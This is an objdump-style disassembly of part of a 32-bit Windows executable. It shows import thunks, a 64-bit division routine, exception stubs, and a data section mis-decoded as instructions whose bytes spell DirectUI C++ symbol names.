  406fb8:	int3   
  406fb9:	int3   
  406fba:	int3   
  406fbb:	int3   
  406fbc:	int3   
  406fbd:	int3   
  406fbe:	int3   
  406fbf:	int3   
  406fc0:	jmp    DWORD PTR ds:0x40a1cc
  406fc6:	int3   
  406fc7:	int3   
  406fc8:	int3   
  406fc9:	int3   
  406fca:	int3   
  406fcb:	int3   
  406fcc:	jmp    DWORD PTR ds:0x40a1d0
  406fd2:	int3   
  406fd3:	int3   
  406fd4:	int3   
  406fd5:	int3   
  406fd6:	int3   
  406fd7:	int3   
  406fd8:	int3   
  406fd9:	int3   
  406fda:	int3   
  406fdb:	int3   
  406fdc:	int3   
  406fdd:	int3   
  406fde:	int3   
  406fdf:	int3   
  406fe0:	jmp    DWORD PTR ds:0x40a1d4
  406fe6:	int3   
  406fe7:	int3   
  406fe8:	int3   
  406fe9:	int3   
  406fea:	int3   
  406feb:	int3   
  406fec:	jmp    DWORD PTR ds:0x40a1d8
  406ff2:	int3   
  406ff3:	int3   
  406ff4:	int3   
  406ff5:	int3   
  406ff6:	int3   
  406ff7:	int3   
  406ff8:	jmp    DWORD PTR ds:0x40a184
  406ffe:	int3   
  406fff:	int3   
  407000:	int3   
  407001:	int3   
  407002:	int3   
  407003:	int3   
  407004:	int3   
  407005:	int3   
  407006:	int3   
  407007:	int3   
  407008:	int3   
  407009:	int3   
  40700a:	int3   
  40700b:	int3   
  40700c:	int3   
  40700d:	int3   
  40700e:	int3   
  40700f:	int3   
  407010:	mov    edi,edi
  407012:	push   ebp
  407013:	mov    ebp,esp
  407015:	push   esi
  407016:	mov    esi,ecx
  407018:	call   DWORD PTR ds:0x40a180
  40701e:	test   BYTE PTR [ebp+0x8],0x1
  407022:	je     0x40702b
  407024:	push   esi
  407025:	call   0x405d96
  40702a:	pop    ecx
  40702b:	mov    eax,esi
  40702d:	pop    esi
  40702e:	pop    ebp
  40702f:	ret    0x4
  407032:	int3   
  407033:	int3   
  407034:	int3   
  407035:	int3   
  407036:	int3   
  407037:	int3   
  407038:	int3   
  407039:	int3   
  40703a:	int3   
  40703b:	int3   
  40703c:	int3   
  40703d:	int3   
  40703e:	int3   
  40703f:	int3   
  407040:	push   edi
  407041:	push   esi
  407042:	push   ebx
  407043:	xor    edi,edi
  407045:	mov    eax,DWORD PTR [esp+0x14]
  407049:	or     eax,eax
  40704b:	jge    0x407061
  40704d:	inc    edi
  40704e:	mov    edx,DWORD PTR [esp+0x10]
  407052:	neg    eax
  407054:	neg    edx
  407056:	sbb    eax,0x0
  407059:	mov    DWORD PTR [esp+0x14],eax
  40705d:	mov    DWORD PTR [esp+0x10],edx
  407061:	mov    eax,DWORD PTR [esp+0x1c]
  407065:	or     eax,eax
  407067:	jge    0x40707d
  407069:	inc    edi
  40706a:	mov    edx,DWORD PTR [esp+0x18]
  40706e:	neg    eax
  407070:	neg    edx
  407072:	sbb    eax,0x0
  407075:	mov    DWORD PTR [esp+0x1c],eax
  407079:	mov    DWORD PTR [esp+0x18],edx
  40707d:	or     eax,eax
  40707f:	jne    0x407099
  407081:	mov    ecx,DWORD PTR [esp+0x18]
  407085:	mov    eax,DWORD PTR [esp+0x14]
  407089:	xor    edx,edx
  40708b:	div    ecx
  40708d:	mov    ebx,eax
  40708f:	mov    eax,DWORD PTR [esp+0x10]
  407093:	div    ecx
  407095:	mov    edx,ebx
  407097:	jmp    0x4070da
  407099:	mov    ebx,eax
  40709b:	mov    ecx,DWORD PTR [esp+0x18]
  40709f:	mov    edx,DWORD PTR [esp+0x14]
  4070a3:	mov    eax,DWORD PTR [esp+0x10]
  4070a7:	shr    ebx,1
  4070a9:	rcr    ecx,1
  4070ab:	shr    edx,1
  4070ad:	rcr    eax,1
  4070af:	or     ebx,ebx
  4070b1:	jne    0x4070a7
  4070b3:	div    ecx
  4070b5:	mov    esi,eax
  4070b7:	mul    DWORD PTR [esp+0x1c]
  4070bb:	mov    ecx,eax
  4070bd:	mov    eax,DWORD PTR [esp+0x18]
  4070c1:	mul    esi
  4070c3:	add    edx,ecx
  4070c5:	jb     0x4070d5
  4070c7:	cmp    edx,DWORD PTR [esp+0x14]
  4070cb:	ja     0x4070d5
  4070cd:	jb     0x4070d6
  4070cf:	cmp    eax,DWORD PTR [esp+0x10]
  4070d3:	jbe    0x4070d6
  4070d5:	dec    esi
  4070d6:	xor    edx,edx
  4070d8:	mov    eax,esi
  4070da:	dec    edi
  4070db:	jne    0x4070e4
  4070dd:	neg    edx
  4070df:	neg    eax
  4070e1:	sbb    edx,0x0
  4070e4:	pop    ebx
  4070e5:	pop    esi
  4070e6:	pop    edi
  4070e7:	ret    0x10
  4070ea:	int3   
  4070eb:	int3   
  4070ec:	int3   
  4070ed:	int3   
  4070ee:	int3   
  4070ef:	int3   
  4070f0:	jmp    DWORD PTR ds:0x40a188
  4070f6:	int3   
  4070f7:	int3   
  4070f8:	int3   
  4070f9:	int3   
  4070fa:	int3   
  4070fb:	int3   
  4070fc:	int3   
  4070fd:	int3   
  4070fe:	int3   
  4070ff:	int3   
  407100:	int3   
  407101:	int3   
  407102:	int3   
  407103:	int3   
  407104:	int3   
  407105:	mov    edx,DWORD PTR [esp+0x8]
  407109:	lea    eax,[edx+0xc]
  40710c:	mov    ecx,DWORD PTR [edx-0x18]
  40710f:	xor    ecx,eax
  407111:	call   0x405d80
  407116:	mov    eax,0x4071dc
  40711b:	jmp    0x40643e
  407120:	int3   
  407121:	int3   
  407122:	int3   
  407123:	int3   
  407124:	int3   
  407125:	mov    edx,DWORD PTR [esp+0x8]
  407129:	lea    eax,[edx+0xc]
  40712c:	mov    ecx,DWORD PTR [edx-0x20]
  40712f:	xor    ecx,eax
  407131:	call   0x405d80
  407136:	mov    eax,0x40729c
  40713b:	jmp    0x40643e
  407140:	int3   
  407141:	int3   
  407142:	int3   
  407143:	int3   
  407144:	int3   
  407145:	int3   
  407146:	int3   
  407147:	int3   
  407148:	int3   
  407149:	int3   
  40714a:	int3   
  40714b:	int3   
  40714c:	int3   
  40714d:	int3   
  40714e:	int3   
  40714f:	int3   
  407150:	mov    DWORD PTR ds:0x40900c,0x4011dc
  40715a:	ret    
  40715b:	int3   
  40715c:	int3   
  40715d:	int3   
  40715e:	int3   
  40715f:	int3   
  407160:	mov    DWORD PTR ds:0x409010,0x4011dc
  40716a:	ret    
  40716b:	int3   
  40716c:	int3   
  40716d:	int3   
  40716e:	int3   
  40716f:	int3   
  407170:	mov    DWORD PTR ds:0x409014,0x4011dc
  40717a:	ret    
  40717b:	int3   
  40717c:	int3   
  40717d:	int3   
  40717e:	int3   
  40717f:	int3   
  407180:	in     al,0xff
  407182:	(bad)  
  407183:	inc    DWORD PTR [eax]
  407185:	add    BYTE PTR [eax],al
  407187:	add    BYTE PTR [edi+edi*8+0xffff],al
  40718e:	add    BYTE PTR [eax],al
  407190:	(bad)  
  407191:	(bad)  
  407192:	(bad)  
  407193:	push   esi
  407195:	pop    esp
  407196:	inc    eax
  407197:	add    dl,bh
  407199:	pop    esp
  40719a:	inc    eax
  40719b:	add    dh,bh
  40719d:	(bad)  
  40719e:	(bad)  
  40719f:	jmp    FWORD PTR [edx-0x41ffbfa4]
  4071a5:	pop    esp
  4071a6:	inc    eax
  4071a7:	add    BYTE PTR [eax+0x0],al
	...
  4071b2:	add    BYTE PTR [eax],al
  4071b4:	(bad)  
  4071b5:	pop    ebp
  4071b6:	inc    eax
  4071b7:	add    bh,bh
  4071b9:	(bad)  
  4071ba:	(bad)  
  4071bb:	inc    DWORD PTR [eax]
  4071bd:	add    BYTE PTR [eax],al
  4071bf:	add    bh,bh
  4071c1:	(bad)  
  4071c2:	(bad)  
  4071c3:	inc    DWORD PTR [eax]
	...
  4071cd:	add    BYTE PTR [eax],al
  4071cf:	add    BYTE PTR [ecx],al
  4071d1:	add    BYTE PTR [eax],al
  4071d3:	add    BYTE PTR [ecx],al
  4071d5:	add    BYTE PTR [eax],al
  4071d7:	add    BYTE PTR [eax+0x22004071],ch
  4071dd:	add    eax,0x21993
  4071e2:	add    BYTE PTR [eax],al
  4071e4:	mov    eax,0x1004071
  4071e9:	add    BYTE PTR [eax],al
  4071eb:	add    al,cl
  4071ed:	jno    0x40722f
	...
  4071fb:	add    BYTE PTR [ecx],al
  4071fd:	add    BYTE PTR [eax],al
  4071ff:	add    dh,bh
  407201:	(bad)  
  407202:	(bad)  
  407203:	inc    DWORD PTR [eax]
  407205:	add    BYTE PTR [eax],al
  407207:	add    ah,dl
  407209:	(bad)  
  40720a:	(bad)  
  40720b:	inc    DWORD PTR [eax]
  40720d:	add    BYTE PTR [eax],al
  40720f:	add    dh,bh
  407211:	(bad)  
  407212:	(bad)  
  407213:	jmp    FWORD PTR [esi+ebx*2+0x5eb00040]
  40721a:	inc    eax
  40721b:	add    BYTE PTR [eax],al
  40721d:	add    BYTE PTR [eax],al
  40721f:	add    dh,bh
  407221:	(bad)  
  407222:	(bad)  
  407223:	inc    DWORD PTR [eax]
  407225:	add    BYTE PTR [eax],al
  407227:	add    al,bl
  407229:	(bad)  
  40722a:	(bad)  
  40722b:	inc    DWORD PTR [eax]
  40722d:	add    BYTE PTR [eax],al
  40722f:	add    dh,bh
  407231:	(bad)  
  407232:	(bad)  
  407233:	dec    DWORD PTR [ebx]
  407235:	pusha  
  407236:	inc    eax
  407237:	add    BYTE PTR [esi],bl
  407239:	pusha  
  40723a:	inc    eax
  40723b:	add    BYTE PTR [eax],al
  40723d:	add    BYTE PTR [eax],al
  40723f:	add    ah,ah
  407241:	(bad)  
  407242:	(bad)  
  407243:	inc    DWORD PTR [eax]
  407245:	add    BYTE PTR [eax],al
  407247:	add    al,cl
  407249:	(bad)  
  40724a:	(bad)  
  40724b:	inc    DWORD PTR [eax]
  40724d:	add    BYTE PTR [eax],al
  40724f:	add    dh,bh
  407251:	(bad)  
  407252:	(bad)  
  407253:	inc    DWORD PTR [eax]
  407255:	add    BYTE PTR [eax],al
  407257:	add    BYTE PTR [edi+0x62],ah
  40725a:	inc    eax
  40725b:	add    BYTE PTR [eax+0x0],al
	...
  407266:	add    BYTE PTR [eax],al
  407268:	dec    ecx
  407269:	imul   eax,DWORD PTR [eax+0x0],0x40
	...
  407278:	enter  0x4069,0x0
  40727c:	(bad)  
  40727d:	(bad)  
  40727e:	(bad)  
  40727f:	inc    DWORD PTR [eax]
  407281:	add    BYTE PTR [eax],al
  407283:	add    bh,bh
  407285:	(bad)  
  407286:	(bad)  
  407287:	inc    DWORD PTR [eax]
  407289:	add    BYTE PTR [eax],al
  40728b:	add    BYTE PTR [ecx],al
  40728d:	add    BYTE PTR [eax],al
  40728f:	add    BYTE PTR [eax],al
  407291:	add    BYTE PTR [eax],al
  407293:	add    BYTE PTR [ecx],al
  407295:	add    BYTE PTR [eax],al
  407297:	add    BYTE PTR [eax],al
  407299:	add    BYTE PTR [eax],al
  40729b:	add    BYTE PTR [edx],ah
  40729d:	add    eax,0x41993
  4072a2:	add    BYTE PTR [eax],al
  4072a4:	jl     0x407318
  4072a6:	inc    eax
  4072a7:	add    BYTE PTR [edx],al
  4072a9:	add    BYTE PTR [eax],al
  4072ab:	add    al,al
  4072ad:	jb     0x4072ef
	...
  4072bb:	add    BYTE PTR [ecx],al
  4072bd:	add    BYTE PTR [eax],al
  4072bf:	add    BYTE PTR [edx],al
  4072c1:	add    BYTE PTR [eax],al
  4072c3:	add    BYTE PTR [edx],al
  4072c5:	add    BYTE PTR [eax],al
  4072c7:	add    BYTE PTR [ebx],al
  4072c9:	add    BYTE PTR [eax],al
  4072cb:	add    BYTE PTR [ecx],al
  4072cd:	add    BYTE PTR [eax],al
  4072cf:	add    BYTE PTR [edx+esi*2+0x40],ch
	...
  4072db:	add    BYTE PTR [ebx],al
  4072dd:	add    BYTE PTR [eax],al
  4072df:	add    BYTE PTR [ecx],al
  4072e1:	add    BYTE PTR [eax],al
  4072e3:	add    BYTE PTR [edx+esi*2+0x40],bl
  4072e7:	add    BYTE PTR [eax],al
  4072e9:	add    BYTE PTR [eax],al
  4072eb:	add    BYTE PTR [eax],ah
  4072ed:	push   0x40
  4072f2:	add    BYTE PTR [eax],al
  4072f4:	clc    
  4072f5:	jb     0x407337
  4072f7:	add    BYTE PTR [edx],al
  4072f9:	add    BYTE PTR [eax],al
  4072fb:	add    BYTE PTR [ebx+esi*2],al
  4072fe:	inc    eax
  4072ff:	add    BYTE PTR [eax],ah
  407301:	jae    0x407343
  407303:	add    BYTE PTR [eax],dl
  407305:	add    BYTE PTR [eax],al
  407307:	add    BYTE PTR [eax+0x4090],dl
  40730d:	add    BYTE PTR [eax],al
  40730f:	add    bh,bh
  407311:	(bad)  
  407312:	(bad)  
  407313:	inc    DWORD PTR [eax]
  407315:	add    BYTE PTR [eax],al
  407317:	add    BYTE PTR [eax+eax*1],cl
  40731a:	add    BYTE PTR [eax],al
  40731c:	pusha  
  40731d:	addr16 inc eax
  40731f:	add    BYTE PTR [eax],al
  407321:	add    BYTE PTR [eax],al
  407323:	add    BYTE PTR [eax+edx*4+0x40],ch
  40732a:	add    BYTE PTR [eax],al
  40732c:	(bad)  
  40732d:	(bad)  
  40732e:	(bad)  
  40732f:	inc    DWORD PTR [eax]
  407331:	add    BYTE PTR [eax],al
  407333:	add    BYTE PTR [eax+eax*1],cl
  407336:	add    BYTE PTR [eax],al
  407338:	shr    BYTE PTR [edi+0x40],0x0
  40733c:	add    BYTE PTR [eax],al
  40733e:	add    BYTE PTR [eax],al
  407340:	les    edx,FWORD PTR [eax+0x40]
  407346:	add    BYTE PTR [eax],al
  407348:	(bad)  
  407349:	(bad)  
  40734a:	(bad)  
  40734b:	inc    DWORD PTR [eax]
  40734d:	add    BYTE PTR [eax],al
  40734f:	add    BYTE PTR [eax+eax*1],cl
  407352:	add    BYTE PTR [eax],al
  407354:	shl    BYTE PTR [edi+0x40],0x0
  407358:	add    BYTE PTR [eax],al
  40735a:	add    BYTE PTR [eax],al
  40735c:	xor    BYTE PTR [eax+0x40],ch
  40735f:	add    BYTE PTR [eax],al
  407361:	add    BYTE PTR [eax],al
  407363:	add    BYTE PTR [eax+0x73],ch
  407366:	inc    eax
  407367:	add    BYTE PTR [ebx],al
  407369:	add    BYTE PTR [eax],al
  40736b:	add    BYTE PTR [eax+0x73],bh
  40736e:	inc    eax
  40736f:	add    BYTE PTR [ebx+esi*2],bh
  407372:	inc    eax
  407373:	add    BYTE PTR [eax],ah
  407375:	jae    0x4073b7
  407377:	add    BYTE PTR [eax],al
  407379:	add    BYTE PTR [eax],al
  40737b:	add    ah,ah
  40737d:	nop
  40737e:	inc    eax
  40737f:	add    BYTE PTR [eax],al
  407381:	add    BYTE PTR [eax],al
  407383:	add    bh,bh
  407385:	(bad)  
  407386:	(bad)  
  407387:	inc    DWORD PTR [eax]
  407389:	add    BYTE PTR [eax],al
  40738b:	add    BYTE PTR [eax+eax*1],cl
  40738e:	add    BYTE PTR [eax],al
  407390:	shl    BYTE PTR [edi+0x40],0x0
  407394:	add    BYTE PTR [eax],al
  407396:	add    BYTE PTR [eax],al
  407398:	xor    BYTE PTR [eax+0x40],ch
  40739b:	add    BYTE PTR [eax],al
  40739d:	add    BYTE PTR [eax],al
  40739f:	add    BYTE PTR [ebx+esi*2+0x30040],ah
  4073a6:	add    BYTE PTR [eax],al
  4073a8:	mov    ah,0x73
  4073aa:	inc    eax
  4073ab:	add    BYTE PTR [ebx+esi*2],bh
  4073ae:	inc    eax
  4073af:	add    BYTE PTR [eax],ah
  4073b1:	jae    0x4073f3
  4073b3:	add    BYTE PTR [eax],al
  4073b5:	add    BYTE PTR [eax],al
  4073b7:	add    BYTE PTR [ecx+edx*4],al
  4073ba:	inc    eax
  4073bb:	add    BYTE PTR [eax],al
  4073bd:	add    BYTE PTR [eax],al
  4073bf:	add    bh,bh
  4073c1:	(bad)  
  4073c2:	(bad)  
  4073c3:	inc    DWORD PTR [eax]
  4073c5:	add    BYTE PTR [eax],al
  4073c7:	add    BYTE PTR [eax+eax*1],cl
  4073ca:	add    BYTE PTR [eax],al
  4073cc:	shl    BYTE PTR [edi+0x40],0x0
  4073d0:	add    DWORD PTR [eax],eax
  4073d2:	add    BYTE PTR [eax],al
  4073d4:	mov    al,0x11
  4073d6:	add    BYTE PTR [eax],al
  4073d8:	mov    WORD PTR [eax+eax*1+0xb06000],ss
  4073df:	add    BYTE PTR [eax-0x7ffff8c],dl
  4073e5:	js     0x4073e7
	...
  4073ef:	add    BYTE PTR [ecx],al
  4073f1:	add    BYTE PTR [eax],al
  4073f3:	add    al,al
  4073f5:	adc    DWORD PTR [eax],eax
  4073f7:	add    BYTE PTR [eax+0x94],dl
  4073fd:	mov    al,0x0
  4073ff:	add    BYTE PTR [eax],dh
  407401:	je     0x407403
  407403:	add    BYTE PTR [eax],al
  407405:	jns    0x407407
	...
  40742f:	add    BYTE PTR [esi-0xfffff8c],ch
  407435:	je     0x407437
  407437:	add    BYTE PTR [esi*2+0x753a0000],bl
  40743e:	add    BYTE PTR [eax],al
  407440:	pusha  
  407441:	jne    0x407443
  407443:	add    BYTE PTR [esi-0x3bffff8b],bl
  407449:	jne    0x40744b
  40744b:	add    ah,bh
  40744d:	jne    0x40744f
  40744f:	add    BYTE PTR [esi+esi*2+0x0],al
  407453:	add    BYTE PTR [edx-0x45ffff8a],al
  407459:	jbe    0x40745b
  40745b:	add    ah,cl
  40745d:	jbe    0x40745f
  40745f:	add    al,ah
  407461:	jbe    0x407463
  407463:	add    BYTE PTR [edx],dl
  407465:	ja     0x407467
  407467:	add    BYTE PTR [edi+esi*2],bl
  40746a:	add    BYTE PTR [eax],al
  40746c:	push   0x76000077
  407471:	ja     0x407473
  407473:	add    BYTE PTR [esi-0x3fffff89],al
  407479:	ja     0x40747b
  40747b:	add    BYTE PTR [edx],dl
  40747d:	js     0x40747f
  40747f:	add    BYTE PTR [eax+edi*2],bh
  407482:	add    BYTE PTR [eax],al
  407484:	test   BYTE PTR [eax+0x0],bh
  407487:	add    ah,dl
  407489:	js     0x40748b
  40748b:	add    BYTE PTR [eax],al
  40748d:	add    BYTE PTR [eax],al
  40748f:	add    BYTE PTR [eax+0x74],bl
  407495:	add    BYTE PTR [eax],al
  407497:	add    BYTE PTR [eax],al
  407499:	add    BYTE PTR [eax+0x72],dl
  40749c:	outs   dx,DWORD PTR ds:[esi]
  40749d:	jo     0x4074f5
  40749f:	popa   
  4074a0:	jb     0x40750b
  4074a2:	popa   
  4074a3:	outs   dx,BYTE PTR ds:[esi]
  4074a4:	je     0x4074fa
  4074a6:	outs   dx,DWORD PTR ds:[esi]
  4074a7:	push   ebp
  4074a8:	dec    ecx
  4074a9:	outs   dx,BYTE PTR ds:[esi]
  4074aa:	je     0x4074df
  4074ac:	xor    al,BYTE PTR [eax]
  4074ae:	add    BYTE PTR [eax],al
  4074b0:	aas    
  4074b1:	push   edx
  4074b2:	gs ins DWORD PTR es:[edi],dx
  4074b4:	outs   dx,DWORD PTR ds:[esi]
  4074b5:	jbe    0x40751c
  4074b7:	dec    esp
  4074b8:	imul   esi,DWORD PTR [ebx+0x74],0x72656e65
  4074bf:	inc    eax
  4074c0:	inc    ebp
  4074c1:	ins    BYTE PTR es:[edi],dx
  4074c2:	gs ins DWORD PTR es:[edi],dx
  4074c4:	outs   dx,BYTE PTR gs:[esi]
  4074c6:	je     0x407508
  4074c8:	inc    esp
  4074c9:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  4074d0:	inc    eax
  4074d1:	inc    eax
  4074d2:	push   ecx
  4074d3:	inc    ecx
  4074d4:	inc    ebp
  4074d5:	pop    eax
  4074d6:	push   eax
  4074d7:	inc    ecx
  4074d8:	push   ebp
  4074d9:	dec    ecx
  4074da:	inc    ebp
  4074db:	ins    BYTE PTR es:[edi],dx
  4074dc:	gs ins DWORD PTR es:[edi],dx
  4074de:	outs   dx,BYTE PTR gs:[esi]
  4074e0:	je     0x40752e
  4074e2:	imul   esi,DWORD PTR [ebx+0x74],0x72656e65
  4074e9:	inc    eax
  4074ea:	xor    al,BYTE PTR [eax+0x40]
  4074ed:	pop    edx
  4074ee:	add    BYTE PTR [eax],al
  4074f0:	add    BYTE PTR [eax],al
  4074f2:	aas    
  4074f3:	inc    ebx
  4074f4:	ins    BYTE PTR es:[edi],dx
  4074f5:	imul   esp,DWORD PTR [ebx+0x6b],0x756f5440
  4074fc:	arpl   WORD PTR [eax+0x42],bp
  4074ff:	jne    0x407575
  407501:	je     0x407572
  407503:	outs   dx,BYTE PTR ds:[esi]
  407504:	inc    eax
  407505:	inc    esp
  407506:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  40750d:	inc    eax
  40750e:	inc    eax
  40750f:	push   ebx
  407510:	inc    edi
  407511:	aas    
  407512:	inc    ecx
  407513:	push   esi
  407514:	push   ebp
  407515:	dec    ecx
  407516:	inc    esp
  407517:	inc    eax
  407518:	inc    eax
  407519:	pop    eax
  40751a:	pop    edx
  40751b:	add    BYTE PTR [eax],al
  40751d:	add    BYTE PTR [edx+0x65],dl
  407520:	imul   esi,DWORD PTR [bp+di+0x74],0x56507265
  407528:	dec    esp
  407529:	inc    edx
  40752a:	gs push 0x6f697661
  407530:	jb     0x407578
  407532:	popa   
  407533:	arpl   WORD PTR [edi+ebp*2+0x72],si
  407537:	jns    0x407539
  407539:	add    BYTE PTR [eax],al
  40753b:	add    BYTE PTR [edi],bh
  40753d:	inc    ebp
  40753e:	outs   dx,BYTE PTR ds:[esi]
  40753f:	fs inc esp
  407541:	gs data16 gs jb 0x407586
  407546:	inc    ebp
  407547:	ins    BYTE PTR es:[edi],dx
  407548:	gs ins DWORD PTR es:[edi],dx
  40754a:	outs   dx,BYTE PTR gs:[esi]
  40754c:	je     0x40758e
  40754e:	inc    esp
  40754f:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  407556:	inc    eax
  407557:	inc    eax
  407558:	push   ecx
  407559:	inc    ecx
  40755a:	inc    ebp
  40755b:	pop    eax
  40755c:	dec    ebx
  40755d:	inc    eax
  40755e:	pop    edx
  40755f:	add    BYTE PTR [eax],al
  407561:	add    BYTE PTR [edi],bh
  407563:	inc    ecx
  407564:	fs fs dec esp
  407567:	imul   esi,DWORD PTR [ebx+0x74],0x72656e65
  40756e:	inc    eax
  40756f:	inc    ebp
  407570:	ins    BYTE PTR es:[edi],dx
  407571:	gs ins DWORD PTR es:[edi],dx
  407573:	outs   dx,BYTE PTR gs:[esi]
  407575:	je     0x4075b7
  407577:	inc    esp
  407578:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  40757f:	inc    eax
  407580:	inc    eax
  407581:	push   ecx
  407582:	inc    ecx
  407583:	inc    ebp
  407584:	dec    edx
  407585:	push   eax
  407586:	inc    ecx
  407587:	push   ebp
  407588:	dec    ecx
  407589:	inc    ebp
  40758a:	ins    BYTE PTR es:[edi],dx
  40758b:	gs ins DWORD PTR es:[edi],dx
  40758d:	outs   dx,BYTE PTR gs:[esi]
  40758f:	je     0x4075dd
  407591:	imul   esi,DWORD PTR [ebx+0x74],0x72656e65
  407598:	inc    eax
  407599:	xor    al,BYTE PTR [eax+0x40]
  40759c:	pop    edx
  40759d:	add    BYTE PTR [eax],al
  40759f:	add    BYTE PTR [edi],bh
  4075a1:	inc    esp
  4075a2:	gs jae 0x407619
  4075a5:	jb     0x407616
  4075a7:	jns    0x4075e9
  4075a9:	inc    ebp
  4075aa:	ins    BYTE PTR es:[edi],dx
  4075ab:	gs ins DWORD PTR es:[edi],dx
  4075ad:	outs   dx,BYTE PTR gs:[esi]
  4075af:	je     0x4075f1
  4075b1:	inc    esp
  4075b2:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  4075b9:	inc    eax
  4075ba:	inc    eax
  4075bb:	push   ecx
  4075bc:	inc    ecx
  4075bd:	inc    ebp
  4075be:	dec    edx
  4075bf:	pop    edi
  4075c0:	dec    esi
  4075c1:	inc    eax
  4075c2:	pop    edx
  4075c3:	add    BYTE PTR [eax],al
  4075c5:	add    BYTE PTR [edi],bh
  4075c7:	inc    ecx
  4075c8:	arpl   WORD PTR [ebx+0x4e],sp
  4075cb:	popa   
  4075cc:	ins    DWORD PTR es:[edi],dx
  4075cd:	gs push eax
  4075cf:	jb     0x407640
  4075d1:	jo     0x407613
  4075d3:	inc    ebp
  4075d4:	ins    BYTE PTR es:[edi],dx
  4075d5:	gs ins DWORD PTR es:[edi],dx
  4075d7:	outs   dx,BYTE PTR gs:[esi]
  4075d9:	je     0x40761b
  4075db:	inc    esp
  4075dc:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  4075e3:	inc    eax
  4075e4:	inc    eax
  4075e5:	push   ebx
  4075e6:	inc    edi
  4075e7:	push   eax
  4075e8:	inc    edx
  4075e9:	push   ebp
  4075ea:	push   eax
  4075eb:	jb     0x40765c
  4075ed:	jo     0x407654
  4075ef:	jb     0x407665
  4075f1:	jns    0x40763c
  4075f3:	outs   dx,BYTE PTR ds:[esi]
  4075f4:	outs   dx,WORD PTR ds:[esi]
  4075f6:	inc    eax
  4075f7:	xor    al,BYTE PTR [eax+0x58]
  4075fa:	pop    edx
  4075fb:	add    BYTE PTR [eax],al
  4075fd:	add    BYTE PTR [edi],bh
  4075ff:	push   ebx
  407600:	gs je  0x407659
  407603:	popa   
  407604:	ins    BYTE PTR es:[edi],dx
  407605:	jne    0x40766c
  407607:	inc    eax
  407608:	inc    ebp
  407609:	ins    BYTE PTR es:[edi],dx
  40760a:	gs ins DWORD PTR es:[edi],dx
  40760c:	outs   dx,BYTE PTR gs:[esi]
  40760e:	je     0x407650
  407610:	inc    esp
  407611:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  407618:	inc    eax
  407619:	inc    eax
  40761a:	push   ecx
  40761b:	inc    ecx
  40761c:	inc    ebp
  40761d:	dec    edx
  40761e:	push   eax
  40761f:	ss inc edi
  407621:	push   eax
  407622:	inc    edx
  407623:	push   ebp
  407624:	push   eax
  407625:	jb     0x407696
  407627:	jo     0x40768e
  407629:	jb     0x40769f
  40762b:	jns    0x407676
  40762d:	outs   dx,BYTE PTR ds:[esi]
  40762e:	outs   dx,WORD PTR ds:[esi]
  407630:	inc    eax
  407631:	xor    al,BYTE PTR [eax+0x58]
  407634:	pop    edx
  407635:	dec    eax
  407636:	push   eax
  407637:	inc    ecx
  407638:	push   esi
  407639:	push   esi
  40763a:	popa   
  40763b:	ins    BYTE PTR es:[edi],dx
  40763c:	jne    0x4076a3
  40763e:	inc    eax
  40763f:	xor    al,BYTE PTR [eax+0x40]
  407642:	pop    edx
  407643:	add    BYTE PTR [eax],al
  407645:	add    BYTE PTR [edi],bh
  407647:	inc    ebx
  407648:	jb     0x4076af
  40764a:	popa   
  40764b:	je     0x4076b2
  40764d:	push   ebx
  40764e:	je     0x4076c2
  407650:	imul   ebp,DWORD PTR [esi+0x67],0x6c615640
  407657:	jne    0x4076be
  407659:	inc    eax
  40765a:	inc    esp
  40765b:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  407662:	inc    eax
  407663:	inc    eax
  407664:	push   ebx
  407665:	inc    edi
  407666:	push   eax
  407667:	inc    ecx
  407668:	push   esi
  407669:	xor    DWORD PTR [edx],esi
  40766b:	inc    eax
  40766c:	push   eax
  40766d:	inc    edx
  40766e:	inc    edi
  40766f:	push   eax
  407670:	inc    ecx
  407671:	push   ebp
  407672:	dec    eax
  407673:	dec    ecx
  407674:	dec    esi
  407675:	push   ebx
  407676:	push   esp
  407677:	inc    ecx
  407678:	dec    esi
  407679:	inc    ebx
  40767a:	inc    ebp
  40767b:	pop    edi
  40767c:	pop    edi
  40767d:	inc    eax
  40767e:	inc    eax
  40767f:	inc    eax
  407680:	pop    edx
  407681:	add    BYTE PTR [eax],al
  407683:	add    BYTE PTR [edi],bh
  407685:	inc    ebx
  407686:	outs   dx,DWORD PTR ds:[esi]
  407687:	outs   dx,BYTE PTR ds:[esi]
  407688:	je     0x4076ef
  40768a:	outs   dx,BYTE PTR ds:[esi]
  40768b:	je     0x4076dd
  40768d:	jb     0x4076fe
  40768f:	jo     0x4076d1
  407691:	inc    ebp
  407692:	ins    BYTE PTR es:[edi],dx
  407693:	gs ins DWORD PTR es:[edi],dx
  407695:	outs   dx,BYTE PTR gs:[esi]
  407697:	je     0x4076d9
  407699:	inc    esp
  40769a:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  4076a1:	inc    eax
  4076a2:	inc    eax
  4076a3:	push   ebx
  4076a4:	inc    edi
  4076a5:	push   eax
  4076a6:	inc    edx
  4076a7:	push   ebp
  4076a8:	push   eax
  4076a9:	jb     0x40771a
  4076ab:	jo     0x407712
  4076ad:	jb     0x407723
  4076af:	jns    0x4076fa
  4076b1:	outs   dx,BYTE PTR ds:[esi]
  4076b2:	outs   dx,WORD PTR ds:[esi]
  4076b4:	inc    eax
  4076b5:	xor    al,BYTE PTR [eax+0x58]
  4076b8:	pop    edx
  4076b9:	add    BYTE PTR [eax],al
  4076bb:	add    BYTE PTR [ecx+0x6e],cl
  4076be:	imul   esi,DWORD PTR [eax+edx*2+0x72],0x7365636f
  4076c6:	jae    0x407718
  4076c8:	jb     0x407733
  4076ca:	jbe    0x4076cc
  4076cc:	add    BYTE PTR [eax],al
  4076ce:	push   ebp
  4076cf:	outs   dx,BYTE PTR ds:[esi]
  4076d0:	dec    ecx
  4076d1:	outs   dx,BYTE PTR ds:[esi]
  4076d2:	imul   esi,DWORD PTR [eax+edx*2+0x72],0x7365636f
  4076da:	jae    0x40772c
  4076dc:	jb     0x407747
  4076de:	jbe    0x4076e0
  4076e0:	add    BYTE PTR [eax],al
  4076e2:	aas    
  4076e3:	inc    esi
  4076e4:	imul   ebp,DWORD PTR [esi+0x64],0x63736544
  4076eb:	outs   dx,BYTE PTR gs:[esi]
